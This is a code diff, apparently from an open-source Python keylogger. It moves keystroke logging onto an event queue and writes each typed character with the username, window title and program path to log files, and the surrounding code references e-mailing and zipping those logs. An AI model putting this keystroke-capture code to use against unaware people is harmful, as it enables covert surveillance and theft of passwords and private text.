@@ -3,6 +3,7 @@ import os, os.path
 import time
 import re
 import sys
+import Queue
 
 # some utility functions
 import myutils
@@ -42,8 +43,10 @@ if sys.version_info[0] == 2 and sys.version_info[1] < 5:
 class LogWriter:
 	'''Manages the writing of log files and logfile maintenance activities.
 	'''
-	def __init__(self, settings, cmdoptions):
+	def __init__(self, settings, cmdoptions, q):
 		
+		self.sepKey = '|' # should move this off into the ini file. just temporarily here.
+		self.q = q
 		self.settings = settings
 		self.cmdoptions = cmdoptions
 		#self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
@@ -105,52 +108,135 @@ class LogWriter:
 		self.flushtimer = mytimer.MyTimer(float(self.settings['General']['Flush Interval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
 		self.flushtimer.start()
 		
+		# start the event queue processing
+		self.queuetimer = mytimer.MyTimer(1, 1, self.start)
+		self.queuetimer.start()
+		
 		# initialize some automatic zip stuff
 		#self.settings['Zip']['ziparchivename'] = "log_[date].zip"
 		if self.settings['Zip']['Zip Enable'] == True:
 			self.ziptimer = mytimer.MyTimer(float(self.settings['Zip']['Zip Interval'])*60*60, 0, self.ZipLogFiles)
 			self.ziptimer.start()
 
-
-	def WriteToLogFile(self, event):
-		'''Write keystroke specified in "event" object to logfile
-		'''
-		loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
+	def start(self):
+		self.stopflag=False
+		self.eventlist = range(7) #initialize our eventlist to something.
+		## line format:
+		## date; time (1 minute resolution); fullapppath; hwnd; username; window title; eventdata
+		##
+		## event data: ascii if normal key, escaped string if "special" key, escaped key if cvs separator
+		##
+		## self.processName = self.GetProcessNameFromHwnd(event.Window) #fullapppath
+		## hwnd = event.Window
+		## username = os.environ['USERNAME']
+		## date = time.strftime('%Y%m%d') 
+		## time = time.strftime('%H%m') #is this correct? or format event.time probably...
+		## windowtitle = str(event.WindowName)
+		
+		## put the line into a list, check if all contents (except for eventdata) are equal, if so, just append eventdata to existing eventdata.
+		## on flush or on exit, make sure to write the latest dataline
+		
+		while self.stopflag == False:
+			try:
+				event = self.q.get(timeout=2)
 				
-		if not loggable:
-			if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
-			return
+				loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
+				if not loggable:
+					if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
+					continue
+				if self.cmdoptions.debug: self.PrintDebug("\nloggable, lets log it\n")
+				loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
+				if not loggable:
+					self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
+					continue
+				
+				eventlisttmp = [time.strftime('%Y%m%d'), 
+								time.strftime('%H%M'), 
+								self.GetProcessNameFromHwnd(event.Window), 
+								event.Window, 
+								os.environ['USERNAME'], 
+								str(event.WindowName), 
+								self.ParseEventValue(event)]
+				if self.eventlist[0:6] == eventlisttmp[0:6]:
+					self.eventlist[6] = str(self.eventlist[6]) + str(eventlisttmp[6])
+				else:
+					self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
+					self.eventlist = eventlisttmp
+			except Queue.Empty:
+				self.PrintDebug("\nempty queue...\n")
+				pass
 		
-		if self.cmdoptions.debug: self.PrintDebug("loggable, lets log it\n")
+	def ParseEventValue(self, event):
+		'''Pass the event ascii value through the requisite filters.
+		Returns the result as a string.
+		'''
+		if chr(event.Ascii) == self.sepKey:
+			return('[sep_key]')
 		
-		loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
-		
-		if not loggable:
-			self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
-			return
-
 		if event.Ascii in self.asciiSubset:
-			self.PrintStuff(chr(event.Ascii))
+			return(chr(event.Ascii))
 		if event.Ascii == 13 and self.settings['General']['Add Line Feed'] == True:
-			self.PrintStuff(chr(10))				 #add line feed after CR,if option is set
+			return(chr(13) + chr(10))				 #add line feed after CR,if option is set
 			
 		#we translate all the special keys, such as arrows, backspace, into text strings for logging
 		#exclude shift keys, because they are already represented (as capital letters/symbols)
 		if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
-			self.PrintStuff('[KeyName:' + event.Key + ']')
+			return('[KeyName:' + event.Key + ']')
 		
 		#translate backspace into text string, if option is set.
 		if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
-			self.PrintStuff('[KeyName:' + event.Key + ']')
+			return('[KeyName:' + event.Key + ']')
 		
 		#translate escape into text string, if option is set.
 		if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
-			self.PrintStuff('[KeyName:' + event.Key + ']')
+			return('[KeyName:' + event.Key + ']')
+		
+		return '' #if nothing matches, just return an empty string, to avoid appearance of "None" in the output.
+		
+	#def WriteToLogFile(self, event):
+	def WriteToLogFile(self):
+		'''Write keystroke specified in "event" object to logfile
+		'''
+		#~ loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
+				
+		#~ if not loggable:
+			#~ if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
+			#~ return
+		
+		#~ if self.cmdoptions.debug: self.PrintDebug("loggable, lets log it\n")
+		
+		#~ loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
+		
+		#~ if not loggable:
+			#~ self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
+			#~ return
 
-		# this has now been disabled, since flushing is done both automatically at interval,
-		# and can also be performed from the control panel.
-		#if event.Key == self.settings['flushkey']:
-		#	self.FlushLogWriteBuffers("Flushing write buffers due to keyboard command\n")
+		#~ if event.Ascii in self.asciiSubset:
+			#~ self.PrintStuff(chr(event.Ascii))
+		#~ if event.Ascii == 13 and self.settings['General']['Add Line Feed'] == True:
+			#~ self.PrintStuff(chr(10))				 #add line feed after CR,if option is set
+			
+		#~ #we translate all the special keys, such as arrows, backspace, into text strings for logging
+		#~ #exclude shift keys, because they are already represented (as capital letters/symbols)
+		#~ if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
+			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
+		
+		#~ #translate backspace into text string, if option is set.
+		#~ if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
+			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
+		
+		#~ #translate escape into text string, if option is set.
+		#~ if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
+			#~ self.PrintStuff('[KeyName:' + event.Key + ']')
+		
+		if self.eventlist != range(7):
+			line = ""
+			for item in self.eventlist:
+				line = line + str(item) + self.sepKey
+			line = line.rstrip(self.sepKey) + '\n'
+			
+			self.PrintStuff(line)
+		
 
 	def TestForNoLog(self, event):
 		'''This function returns False if the process name associated with an event
@@ -510,8 +596,14 @@ class LogWriter:
 	def stop(self):
 		'''To exit cleanly, flush all write buffers, and stop all running timers.
 		'''
+		self.stopflag = True
+		time.sleep(3)
+		self.queuetimer.cancel()
+		self.WriteToLogFile()
+		
 		self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
 		self.flushtimer.cancel()
+
 		if self.settings['E-mail']['SMTP Send Email'] == True:
 			self.emailtimer.cancel()
 		if self.settings['Log Maintenance']['Delete Old Logs'] == True:
@@ -520,6 +612,7 @@ class LogWriter:
 			self.timestamptimer.cancel()
 		if self.settings['Zip']['Zip Enable'] == True:
 			self.ziptimer.cancel()
+		
 
 if __name__ == '__main__':
 	#some testing code
